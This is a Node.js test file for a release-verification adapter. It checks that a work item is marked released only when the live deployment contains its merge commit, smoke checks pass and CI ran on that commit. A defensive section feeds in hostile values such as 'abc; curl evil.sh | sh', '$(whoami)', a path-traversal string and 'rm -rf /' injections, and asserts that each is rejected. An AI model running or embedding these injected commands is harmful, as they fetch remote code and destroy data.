import assert from 'node:assert/strict';
import { emptyState, evidenceTypes, missingEvidence, validateState } from '../src/control-plane.mjs';
import { assertSha, containsCommit, liveCommit, mergeCheckState, pluck, releaseCandidates, runCheck, syncRelease } from '../src/release.mjs';

const NOW = '2026-08-28T12:00:00Z';
const MERGE = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
const LIVE = 'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb';

const repo = () => ({
  name: 'acme/api',
  release: {
    versionUrl: 'https://api.example.com/version',
    commitPath: 'build.commit',
    checks: [
      { name: 'health', url: 'https://api.example.com/health', expectStatus: 200 },
      { name: 'auth-required', url: 'https://api.example.com/me', expectStatus: 401 },
    ],
  },
});

const board = (overrides = {}) => {
  const state = { ...emptyState(), repos: [repo()] };
  state.workItems.push({
    id: 'api#7', title: 'Rate limit', owner: 'openclaw', repository: 'acme/api', issue: 7, pr: 31,
    status: 'verified', statusAt: NOW, head: 'cccccccccccccccccccccccccccccccccccccccc', mergeCommit: MERGE, mergedAt: NOW,
    evidence: [
      { type: 'executor_started', source: 'PR #31 opened', observedAt: NOW },
      { type: 'executor_result', source: 'PR #31 ready for review', observedAt: NOW },
      { type: 'verification_passed', source: 'PR #31 checks green at the head', observedAt: NOW, commit: 'cccccccccccccccccccccccccccccccccccccccc' },
    ],
    ...overrides,
  });
  return state;
};

const stub = ({ version = { build: { commit: LIVE } }, status = 200, checks = {}, compare = 'ahead', mergeCi = 'SUCCESS' } = {}) => ({
  get: async (url) => {
    if (url.endsWith('/version')) return { status, body: JSON.stringify(version) };
    return { status: checks[url] ?? (url.endsWith('/me') ? 401 : 200), body: 'ok' };
  },
  api: async (args) => {
    const route = args[1];
    if (route.includes('/compare/')) return { ok: true, output: compare };
    if (route.endsWith('/check-runs')) return { ok: true, output: mergeCi ? JSON.stringify({ status: 'COMPLETED', conclusion: mergeCi }) : '' };
    return { ok: true, output: '' };
  },
  run: async () => ({ ok: true, output: '' }),
});

assert.equal(pluck({ build: { commit: 'abc' } }, 'build.commit'), 'abc');
assert.equal(pluck({}, 'build.commit'), undefined);
assert.equal(await liveCommit(repo().release, stub()), LIVE);
await assert.rejects(() => liveCommit(repo().release, stub({ status: 503 })), /returned 503/);
await assert.rejects(() => liveCommit(repo().release, stub({ version: {} })), /no commit at "build.commit"/);

// The happy path: production contains the merge and every check passes.
let state = board();
let changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub() });
let item = state.workItems[0];
assert.deepEqual(changes, [`api#7: verified → released (live ${LIVE.slice(0, 7)})`]);
assert.equal(item.status, 'released');
const smoke = item.evidence.at(-1);
assert.equal(smoke.type, 'release_smoke_passed');
assert.equal(smoke.deployed, LIVE);
assert.equal(smoke.commit, 'cccccccccccccccccccccccccccccccccccccccc', 'bound to the item head so a later push retires it');
assert.match(smoke.source, new RegExp(`contains merge ${MERGE}`));
assert.deepEqual(validateState(state), []);

// The check that matters: green smoke against a deployment predating the merge.
state = board();
changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub({ compare: 'behind' }) });
assert.match(changes.join('\n'), /is not in the live deployment/);
assert.equal(state.workItems[0].status, 'verified', 'a passing smoke run cannot release code that is not deployed');
assert.deepEqual(missingEvidence(state.workItems[0], 'released'), ['release_smoke_passed']);

// Diverged history is not containment either.
state = board();
await syncRelease(state, state.repos[0], { now: NOW, ...stub({ compare: 'diverged' }) });
assert.equal(state.workItems[0].status, 'verified');

// An unknown live commit records nothing rather than assuming the newest thing is live.
state = board();
changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub({ status: 500 }) });
assert.match(changes.join('\n'), /cannot determine the live commit.*recorded no release evidence/s);
assert.equal(state.workItems[0].status, 'verified');

// A failing smoke check blocks with the live commit named.
state = board();
changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub({ checks: { 'https://api.example.com/health': 502 } }) });
assert.equal(state.workItems[0].status, 'blocked');
assert.match(state.workItems[0].blockedReason, /smoke checks failed against live bbbbbbb: health \(expected 200, got 502\)/);
assert.ok(!evidenceTypes(state.workItems[0]).has('release_smoke_passed'));

// No configured checks is not a silent pass.
state = board();
state.repos[0].release.checks = [];
changes = await syncRelease(state, state.repos[0], { now: NOW, ...stub() });
assert.match(changes.join('\n'), /refusing to certify a release without them/);
assert.equal(state.workItems[0].status, 'verified');

// Only merged, verified, not-yet-released work is a candidate.
assert.deepEqual(releaseCandidates(board({ status: 'reported_done' }), 'acme/api'), []);
assert.deepEqual(releaseCandidates(board({ mergeCommit: undefined }), 'acme/api'), []);
assert.equal(releaseCandidates(board(), 'acme/api').length, 1);
state = board();
await syncRelease(state, state.repos[0], { now: NOW, ...stub() });
assert.deepEqual(await syncRelease(state, state.repos[0], { now: NOW, ...stub() }), [], 'a released item is not smoke-checked again');

// A push after release retires the smoke evidence with everything else.
state = board();
await syncRelease(state, state.repos[0], { now: NOW, ...stub() });
state.workItems[0].head = 'dddddddddddddddddddddddddddddddddddddddd';
assert.deepEqual(missingEvidence(state.workItems[0], 'released'), ['verification_passed', 'release_smoke_passed']);

// Individual checks: commands, bodies, and unreachable hosts.
assert.deepEqual(await runCheck({ name: 'c', command: 'true' }, { run: async () => ({ ok: true, output: '' }) }), { name: 'c', ok: true, detail: 'exit 0' });
assert.deepEqual(await runCheck({ name: 'c', command: 'false' }, { run: async () => ({ ok: false, output: 'nope' }) }), { name: 'c', ok: false, detail: 'nope' });
assert.equal((await runCheck({ name: 'b', url: 'u', expectBody: 'healthy' }, { get: async () => ({ status: 200, body: 'degraded' }) })).ok, false);
assert.match((await runCheck({ name: 'x', url: 'u' }, { get: async () => { throw new Error('ECONNREFUSED'); } })).detail, /ECONNREFUSED/);
await assert.rejects(() => containsCommit('a/b', MERGE, LIVE, { api: async () => ({ ok: false, output: 'no such ref' }) }), /cannot compare/);
assert.equal(await containsCommit('a/b', MERGE, MERGE, { api: async () => { throw new Error('must not call gh'); } }), true);

// --- the version endpoint is untrusted input ---

// It is on the network, so treat its body as hostile. A value that is not a
// plain SHA never reaches an argument list or an API path.
for (const hostile of ['abc; curl evil.sh | sh', '$(whoami)', '`id`', '../../../../etc/passwd', 'main', 'aaa aaa', '']) {
  await assert.rejects(
    () => liveCommit(repo().release, stub({ version: { build: { commit: hostile } } })),
    /is not a commit SHA|no commit at/,
    `the version endpoint must not be able to return ${JSON.stringify(hostile)}`,
  );
}
assert.throws(() => assertSha('deadbeef; rm -rf /', 'x'), /is not a commit SHA/);
assert.equal(assertSha('DEADBEEF0123', 'x'), 'DEADBEEF0123', 'short and upper-case SHAs are still SHAs');

// gh is never handed a constructed command string; injection has nothing to land in.
let seen = null;
await containsCommit('acme/api', MERGE, LIVE, { api: async (args) => { seen = args; return { ok: true, output: 'ahead' }; } });
assert.ok(Array.isArray(seen), 'gh is invoked with an argument list');
assert.deepEqual(seen, ['api', `repos/acme/api/compare/${MERGE}...${LIVE}`, '--jq', '.status']);
await assert.rejects(() => containsCommit('acme/api; rm -rf /', MERGE, LIVE, {}), /not an owner\/repo name/);

// A hostile endpoint aborts the whole repo rather than certifying anything.
let state2 = board();
const poisoned = await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ version: { build: { commit: 'x; rm -rf /' } } }) });
assert.match(poisoned.join('\n'), /cannot determine the live commit.*is not a commit SHA/s);
assert.equal(state2.workItems[0].status, 'verified');

// --- CI must have run on the commit that is actually deployed ---

// A squash merge is a different commit than the PR head that CI tested.
state2 = board();
let out = await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ mergeCi: null }) });
assert.match(out.join('\n'), /has no CI run of its own; the deployed commit is not verified/);
assert.equal(state2.workItems[0].status, 'verified', 'production smoke alone does not prove the artifact was tested');

state2 = board();
out = await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ mergeCi: 'FAILURE' }) });
assert.match(out.join('\n'), /has CI failing; the deployed commit is not verified/);
assert.equal(state2.workItems[0].status, 'verified');

// With CI green on the merge commit, the claim is complete and says so.
state2 = board();
await syncRelease(state2, state2.repos[0], { now: NOW, ...stub() });
assert.equal(state2.workItems[0].status, 'released');
assert.match(state2.workItems[0].evidence.at(-1).source, /CI green on the merge commit/);
assert.equal(state2.workItems[0].evidence.at(-1).mergeCommit, MERGE);

// Opting out is allowed, but the evidence records what was not proven.
state2 = board();
state2.repos[0].release.requireMergeChecks = false;
await syncRelease(state2, state2.repos[0], { now: NOW, ...stub({ mergeCi: null }) });
assert.equal(state2.workItems[0].status, 'released');
assert.match(state2.workItems[0].evidence.at(-1).source, /the deployed artifact's own CI is unproven/);

assert.equal(await mergeCheckState('a/b', MERGE, { api: async () => ({ ok: true, output: '' }) }), 'none');
assert.equal(await mergeCheckState('a/b', MERGE, { api: async (args) => ({ ok: true, output: args[1].endsWith('/status') ? JSON.stringify({ state: 'SUCCESS' }) : '' }) }), 'passing', 'external CI reports as commit statuses');
await assert.rejects(() => mergeCheckState('a/b', MERGE, { api: async () => ({ ok: false, output: '404' }) }), /cannot read checks/);
console.log('release adapter tests: passed');
